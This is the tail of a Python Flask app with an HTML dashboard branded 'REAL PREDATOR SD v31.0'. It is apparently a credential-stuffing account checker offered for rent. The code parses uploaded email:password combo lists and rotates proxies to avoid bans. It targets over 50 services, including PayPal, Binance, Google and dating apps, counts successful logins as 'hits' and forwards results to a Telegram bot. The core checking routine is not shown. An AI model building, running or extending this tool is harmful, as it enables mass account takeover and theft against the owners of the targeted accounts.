.platform-select label{color:#00ff41;font-size:11px;font-weight:bold}
.telegram-config{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:6px 10px;background:rgba(0,136,204,0.05);border:1px solid rgba(0,136,204,0.15);border-radius:6px;margin-bottom:4px}
.telegram-config input{padding:4px 10px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,136,204,0.2);border-radius:4px;color:#00ff41;font-size:9px;font-family:'Share Tech Mono',monospace;flex:1;min-width:120px}
.telegram-config input:focus{outline:none;border-color:#0088cc}
.telegram-config label{color:#0088cc;font-size:8px;font-weight:700}
.telegram-config .status{font-size:8px;padding:2px 10px;border-radius:12px}
.telegram-config .status.on{background:rgba(0,255,65,0.1);color:#00ff41;border:1px solid #00ff41}
.telegram-config .status.off{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044}
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(4,1fr)}.header h1{font-size:14px}}
</style>
</head>
<body>
<header class="header">
    <div class="header-left">
        <div class="whatsapp-pulse" onclick="window.open('https://whatsapp.com/channel/0029Vb8vFQw2kNFqPIWe3B3H','_blank')">
            <i class="fab fa-whatsapp"></i>
        </div>
        <h1>REAL <span>PREDATOR</span> <span class="sd">SD</span></h1>
        <span class="binary-badge">⚡ v31.0 ULTIMATE</span>
    </div>
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
        <a href="https://wa.me/249907118667" target="_blank" class="social-btn whatsapp"><i class="fab fa-whatsapp" style="font-size:18px;"></i> WhatsApp</a>
        <a href="https://t.me/MRDPY" target="_blank" class="social-btn telegram"><i class="fab fa-telegram" style="font-size:18px;"></i> Telegram</a>
        <a href="#" onclick="alert('Rental contact:\\nWhatsApp: +249907118667\\nTelegram: @MRDPY')" class="social-btn rent"><i class="fas fa-clock"></i> Rent</a>
        <a href="/logout" class="btn btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
    </div>
</header>
<div class="container">
    <div class="top-bar">
        <span style="font-size:9px;color:#00ff41;"><i class="fas fa-shield-alt"></i> SECURE</span>
        <span class="viewers-badge"><i class="fas fa-eye eye"></i> <span id="viewersCount">0</span></span>
    </div>

    <div class="telegram-config">
        <label><i class="fab fa-telegram"></i> Bot Token:</label>
        <input type="text" id="tgToken" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz">
        <label>Chat ID:</label>
        <input type="text" id="tgChatId" placeholder="123456789">
        <button class="btn" id="tgSaveBtn" style="border-color:#0088cc;color:#0088cc;padding:4px 14px;font-size:9px;"><i class="fas fa-save"></i> Save</button>
        <button class="btn" id="tgTestBtn" style="border-color:#ffd700;color:#ffd700;padding:4px 14px;font-size:9px;"><i class="fas fa-paper-plane"></i> Test</button>
        <span class="status off" id="tgStatus">⚪ OFF</span>
    </div>

    <div class="platform-select">
        <label>🎯 Target Platform:</label>
        <select id="targetPlatform">
            <option value="">🔄 Random (All 50+ Platforms)</option>
            <option value="Google">🔵 Google</option>
            <option value="Microsoft">💻 Microsoft</option>
            <option value="Facebook">📘 Facebook</option>
            <option value="Instagram">📷 Instagram</option>
            <option value="Twitter">🐦 Twitter</option>
            <option value="TikTok">🎵 TikTok</option>
            <option value="Spotify">🎵 Spotify</option>
            <option value="Netflix">🎬 Netflix</option>
            <option value="Discord">💬 Discord</option>
            <option value="Steam">🎮 Steam</option>
            <option value="WhatsApp">💬 WhatsApp</option>
            <option value="Telegram">✈️ Telegram</option>
            <option value="Tinder">❤️ Tinder</option>
            <option value="Bumble">🐝 Bumble</option>
            <option value="PayPal">💳 PayPal</option>
            <option value="Binance">💰 Binance</option>
            <option value="Amazon Prime">📦 Amazon</option>
            <option value="Reddit">🤖 Reddit</option>
            <option value="LinkedIn">💼 LinkedIn</option>
            <option value="Epic Games">🎮 Epic Games</option>
            <option value="PlayStation">🎮 PlayStation</option>
            <option value="Xbox">🎮 Xbox</option>
            <option value="Snapchat">👻 Snapchat</option>
            <option value="GitHub">🐙 GitHub</option>
            <option value="Apple">🍎 Apple</option>
            <option value="Yahoo">📧 Yahoo</option>
            <option value="ProtonMail">🔐 ProtonMail</option>
            <option value="Riot Games">🎮 Riot Games</option>
            <option value="Twitch">🎮 Twitch</option>
            <option value="Signal">🔐 Signal</option>
            <option value="WeChat">💬 WeChat</option>
            <option value="Line">💬 Line</option>
            <option value="Viber">📱 Viber</option>
            <option value="Skype">💬 Skype</option>
            <option value="Zoom">🎥 Zoom</option>
            <option value="Coinbase">💰 Coinbase</option>
            <option value="Kraken">💰 Kraken</option>
            <option value="Hinge">💕 Hinge</option>
            <option value="OKCupid">💑 OKCupid</option>
            <option value="Grindr">🌈 Grindr</option>
            <option value="Badoo">💋 Badoo</option>
            <option value="Muzz">🕌 Muzz</option>
            <option value="Shaadi.com">💍 Shaadi.com</option>
            <option value="Hulu">📺 Hulu</option>
            <option value="Disney+">📺 Disney+</option>
            <option value="HBO Max">📺 HBO Max</option>
        </select>
        <button class="btn" id="applyTargetBtn" style="border-color:#ffd700;color:#ffd700;">🎯 Apply</button>
        <span id="targetStatus" style="color:#006622;font-size:9px;">⚪ Random</span>
    </div>

    <!-- BEAUTIFUL PLATFORM GRID WITH COLORS -->
    <div class="card">
        <div class="card-title"><i class="fas fa-globe"></i> PLATFORMS <span style="font-size:8px;color:#006622;">(50+ supported)</span></div>
        <div class="platform-grid" id="platformGrid">
            {% for p in platforms %}
            <div class="platform-badge {% if p.gaming %}gaming{% endif %}" data-platform="{{ p.check }}" onclick="selectPlatform('{{ p.check }}')" style="border-color:{{ p.color }}33;">
                <span class="icon"><i class="{{ p.icon }}" style="color:{{ p.color }}"></i></span>
                {{ p.name[:8] }}
            </div>
            {% endfor %}
        </div>
    </div>

    <div class="card">
        <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;justify-content:space-between;">
            <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
                <span class="status-badge stopped" id="statusBadge">
                    <span class="status-dot stopped" id="statusDot"></span>
                    <span id="statusText">OFF</span>
                </span>
                <span style="color:#006622;font-size:8px;"><i class="fas fa-clock"></i> <span id="elapsed">00:00:00</span></span>
                <span style="color:#006622;font-size:8px;"><i class="fas fa-tachometer-alt"></i> <span id="cpm">0</span></span>
            </div>
            <div style="font-size:9px;">
                <span style="color:#00ff41;">🟢 <span id="hitCount">0</span></span>
                <span style="color:#ff0044;margin-right:5px;">❌ <span id="badCount">0</span></span>
            </div>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-box green"><span class="num" id="statChecked">0</span><span class="label">SCAN</span></div>
        <div class="stat-box gold"><span class="num" id="statHits">0</span><span class="label">HITS</span></div>
        <div class="stat-box red"><span class="num" id="statBad">0</span><span class="label">BAD</span></div>
        <div class="stat-box blue"><span class="num" id="statErrors">0</span><span class="label">ERR</span></div>
        <div class="stat-box gold"><span class="num" id="statGaming">0</span><span class="label">GAME</span></div>
        <div class="stat-box green"><span class="num" id="statRemaining">0</span><span class="label">REMAIN</span></div>
        <div class="stat-box green"><span class="num" id="statTotal">0</span><span class="label">TOTAL</span></div>
        <div class="stat-box red"><span class="num" id="statSpeed">0</span><span class="label">RPM</span></div>
    </div>

    <div class="card">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="progress-text"><span id="progressPct">0%</span><span id="progressCount">0 / 0</span></div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn" id="clearBtn" style="border-color:rgba(255,255,255,0.1);color:#006622;"><i class="fas fa-trash"></i></button>
            <div class="config-row" style="margin-right:auto;">
                <label>RPM:</label>
                <input type="number" id="speedInput" value="35" min="5" max="70">
            </div>
        </div>
        <div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:5px;padding-top:5px;border-top:1px solid rgba(0,255,65,0.05);">
            <div class="config-row">
                <label><i class="fas fa-upload"></i> Combo:</label>
                <input type="file" id="comboFile" accept=".txt" style="display:none;" multiple>
                <label for="comboFile" style="padding:3px 8px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;cursor:pointer;font-size:8px;">Choose</label>
                <span id="comboName" style="color:#006622;font-size:7px;">None</span>
            </div>
            <div class="config-row" style="flex:1;min-width:180px;">
                <label><i class="fas fa-network-wired"></i> Proxy:</label>
                <textarea id="proxyInput" placeholder="proxy1:port&#10;proxy2:port" style="height:35px;font-size:8px;flex:1;min-width:100px;"></textarea>
                <button class="btn" id="proxyApplyBtn" style="padding:2px 8px;font-size:8px;">Apply</button>
                <span id="proxyCount" style="color:#006622;font-size:7px;">0</span>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-broadcast"></i> FEED <span style="font-size:8px;color:#006622;" id="feedCount">(0)</span></div>
        <div class="feed-container" id="feedContainer"><div class="empty-state">⏳ Waiting for hits...</div></div>
    </div>

    <div class="card">
        <div class="card-title"><i class="fas fa-database" style="color:#ffd700;"></i> HITS <span style="font-size:8px;color:#006622;" id="resultCount">(0)</span></div>
        <div class="result-container" id="resultContainer"><div class="empty-state">📭 No hits yet</div></div>
    </div>

    <div style="text-align:center;padding:10px;color:#006622;font-size:8px;border-top:1px solid rgba(0,255,65,0.05);margin-top:10px;">
        ⚡ REAL PREDATOR SD v31.0 | Developer: @MRDPY | WhatsApp: +249907118667
    </div>
</div>

<script>
const $=id=>document.getElementById(id);
let targetPlatform = '';
let state={running:false,checked:0,total:1,hits:0,bad:0,errors:0,gaming:0,forced:0};

async function api(endpoint,method='GET',data=null){
    const opts={method,headers:{'Content-Type':'application/json'}};
    if(data)opts.body=JSON.stringify(data);
    try{const res=await fetch(endpoint,opts);return await res.json();}catch(e){return{success:false};}
}

function selectPlatform(platform){
    document.querySelectorAll('.platform-badge').forEach(el=>{
        el.classList.toggle('selected', el.dataset.platform === platform);
    });
}

$('applyTargetBtn').addEventListener('click', async function(){
    const platform = document.getElementById('targetPlatform').value;
    targetPlatform = platform;
    const res = await api('/api/target','POST',{platform:platform});
    if(res.success){
        document.getElementById('targetStatus').textContent = platform ? '🎯 ' + platform : '⚪ Random';
        document.getElementById('targetStatus').style.color = platform ? '#ffd700' : '#006622';
        // Highlight platform in grid
        document.querySelectorAll('.platform-badge').forEach(el=>{
            el.classList.toggle('selected', el.dataset.platform === platform.toLowerCase());
        });
    }
});

$('tgSaveBtn').addEventListener('click', async function(){
    const token=$('tgToken').value.trim();
    const chatId=$('tgChatId').value.trim();
    if(!token || !chatId){alert('⚠️ Enter both Token and Chat ID');return;}
    const res=await api('/api/tg_config','POST',{token:token,chat_id:chatId});
    if(res.success){
        document.getElementById('tgStatus').className='status on';
        document.getElementById('tgStatus').textContent='✅ ON';
        alert('✅ Telegram config saved!');
    }
});

$('tgTestBtn').addEventListener('click', async function(){
    const token=$('tgToken').value.trim();
    const chatId=$('tgChatId').value.trim();
    if(!token || !chatId){alert('⚠️ Enter both Token and Chat ID');return;}
    try{
        const resp=await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:chatId,text:'⚡ Test message from REAL PREDATOR SD v31.0\nDeveloper: @MRDPY'})
        });
        const data=await resp.json();
        if(data.ok){
            document.getElementById('tgStatus').className='status on';
            document.getElementById('tgStatus').textContent='✅ ON';
            alert('✅ Test message sent successfully!');
        }else{
            alert('❌ Failed: '+data.description);
        }
    }catch(e){alert('❌ Connection error');}
});

$('comboFile').addEventListener('change', function(e){
    if(this.files.length>0){
        const names=Array.from(this.files).map(f=>f.name).join(', ');
        $('comboName').textContent=names.length>30?names.slice(0,30)+'...':names;
        Array.from(this.files).forEach(file=>{
            const reader=new FileReader();
            reader.onload=async function(ev){await api('/api/upload/combo','POST',{content:ev.target.result,filename:file.name});};
            reader.readAsText(file);
        });
    }
});

$('proxyApplyBtn').addEventListener('click', async function(){
    const content=$('proxyInput').value;
    if(!content.trim()){alert('Enter proxy');return;}
    const res=await api('/api/upload/proxy','POST',{content:content});
    if(res.success){document.getElementById('proxyCount').textContent=res.count;alert('✅ Applied '+res.count+' proxies');}
});

$('startBtn').addEventListener('click', async function(){
    const speed=parseInt($('speedInput').value)||35;
    const tgToken = $('tgToken').value.trim();
    const tgChatId = $('tgChatId').value.trim();
    const data = {speed, target: targetPlatform};
    if(tgToken) data.tg_token = tgToken;
    if(tgChatId) data.tg_chat_id = tgChatId;
    const res=await api('/api/start','POST',data);
    if(res.success){
        $('statusBadge').className='status-badge running';
        $('statusDot').className='status-dot running';
        $('statusText').textContent='RUNNING';
        $('startBtn').disabled=true;
        $('stopBtn').disabled=false;
    }
});

$('stopBtn').addEventListener('click',async()=>{
    await api('/api/stop','POST');
    $('statusBadge').className='status-badge stopped';
    $('statusDot').className='status-dot stopped';
    $('statusText').textContent='OFF';
    $('startBtn').disabled=false;
    $('stopBtn').disabled=true;
});

$('clearBtn').addEventListener('click',async()=>{if(!confirm('Clear?'))return;await api('/api/clear','POST');});

async function updateStats(){
    try{
        const d=await api('/api/stats');
        if(!d.success)return;
        state.running=d.running;state.checked=d.checked;state.total=d.total||1;
        state.hits=d.hits;state.bad=d.bad;state.errors=d.errors||0;
        $('statChecked').textContent=state.checked;
        $('statHits').textContent=state.hits;
        $('statBad').textContent=state.bad;
        $('statErrors').textContent=state.errors;
        $('hitCount').textContent=state.hits;
        $('badCount').textContent=state.bad;
        $('cpm').textContent=d.cpm||0;
        $('statSpeed').textContent=d.cpm||0;
        const pct=state.total>0?Math.min((state.checked/state.total)*100,100):0;
        $('progressFill').style.width=pct+'%';
        $('progressPct').textContent=pct.toFixed(1)+'%';
        $('progressCount').textContent=state.checked+' / '+state.total;
        $('viewersCount').textContent=d.viewers||0;
    }catch(e){}
}

async function updateFeed(){
    try{
        const d=await api('/api/feed');
        if(!d.success)return;
        const c=$('feedContainer');
        if(!d.feed||d.feed.length===0){c.innerHTML='<div class="empty-state">⏳ Waiting for hits...</div>';return;}
        c.innerHTML=d.feed.slice(0,80).map(item=>{
            const cls=item.type||'info';
            return `<div class="feed-item ${cls}"><span class="time">${item.time||''}</span><span>${item.text||''}</span></div>`;
        }).join('');
        $('feedCount').textContent='('+d.feed.length+')';
    }catch(e){}
}

async function updateResults(){
    try{
        const d=await api('/api/results');
        if(!d.success)return;
        const c=$('resultContainer');
        if(!d.results||d.results.length===0){c.innerHTML='<div class="empty-state">📭 No hits yet</div>';return;}
        c.innerHTML=d.results.map(item=>{
            const gamingClass=item.is_gaming?'gaming':'';
            const badge=item.is_gaming?'<span class="gaming-badge">🎮</span>':'';
            return `<div class="result-item ${gamingClass}">${badge}${item.content}</div>`;
        }).join('');
        $('resultCount').textContent='('+d.results.length+')';
    }catch(e){}
}

setInterval(updateStats,500);
setInterval(updateFeed,600);
setInterval(updateResults,600);
updateStats();updateFeed();updateResults();
</script>
</body>
</html>'''

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route('/')
def index():
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    password = request.json.get('password', '').strip()
    if password == ADMIN_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid password'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('index'))
    return render_template_string(DASHBOARD_TEMPLATE, platforms=PLATFORMS)

@app.route('/api/target', methods=['POST'])
def set_target():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    platform = request.json.get('platform', '')
    if platform:
        predator.set_target_platform(platform)
    else:
        predator.target_platform = None
    return jsonify({'success': True, 'target': platform or 'Random'})

@app.route('/api/tg_config', methods=['POST'])
def tg_config():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json
    predator.configure_telegram(data.get('token', ''), data.get('chat_id', ''))
    return jsonify({'success': True, 'enabled': predator.telegram_enabled})

@app.route('/api/start', methods=['POST'])
def start_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    if state['running']:
        return jsonify({'success': False, 'error': 'Already running'})
    
    data = request.json or {}
    
    if data.get('tg_token') and data.get('tg_chat_id'):
        predator.configure_telegram(data['tg_token'], data['tg_chat_id'])
    
    if data.get('target'):
        predator.set_target_platform(data['target'])
    
    state['running'] = True
    state['checked'] = 0
    state['hits'] = 0
    state['errors'] = 0
    state['results'] = []
    state['feed'] = []
    
    threading.Thread(target=predator_loop, daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['running'] = False
    return jsonify({'success': True})

@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    return jsonify({
        'success': True,
        'running': state['running'],
        'checked': state['checked'],
        'hits': state['hits'],
        'errors': state['errors'],
        'feed': state['feed'][:30],
        'results': state['results'][:20]
    })

@app.route('/api/feed')
def get_feed():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state['feed'][:80]})

@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'results': state['results'][:20]})

@app.route('/api/clear', methods=['POST'])
def clear_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['results'] = []
    state['feed'] = []
    return jsonify({'success': True})

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    content = request.json.get('content', '')
    combos = []
    
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        
        for sep in [':', '|', ';', '\t']:
            if sep in line:
                parts = line.split(sep, 1)
                if len(parts) == 2:
                    combos.append((parts[0].strip(), parts[1].strip()))
                    break
        else:
            if '@' in line:
                combos.append((line, ''))
    
    predator.add_combos(combos)
    return jsonify({'success': True, 'count': len(combos)})

@app.route('/api/upload/proxy', methods=['POST'])
def upload_proxy():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    proxies = [p.strip() for p in request.json.get('content', '').split('\n') if p.strip()]
    for proxy in proxies:
        predator.anti_ban.add_proxy(proxy)
    return jsonify({'success': True, 'count': len(proxies)})

# ================================================================
# RUN
# ================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 7080))
    
    print("""
╔══════════════════════════════════════════════════════════════════╗
║   REAL PREDATOR SD v31.0 - ULTIMATE HUNTER                    ║
║   🔥 50+ BEAUTIFUL PLATFORMS WITH COLORS                      ║
║   ⚡ ANTI-BAN SYSTEM WITH PROXY ROTATION                     ║
║   🎯 TARGET SPECIFIC PLATFORM OR RANDOM                      ║
║   📨 TELEGRAM WITH WEB REGISTRATION LINK                     ║
║   📱 DEVELOPER: @MRDPY                                       ║
║   💬 WhatsApp: +249907118667                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server running on port: {port}")
    print(f"[*] Access: http://localhost:{port}")
    print(f"[*] Password: {ADMIN_PASSWORD}")
    print(f"[*] 50+ Beautiful Platforms ready for hunting")
    print(f"[*] Developer: @MRDPY")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
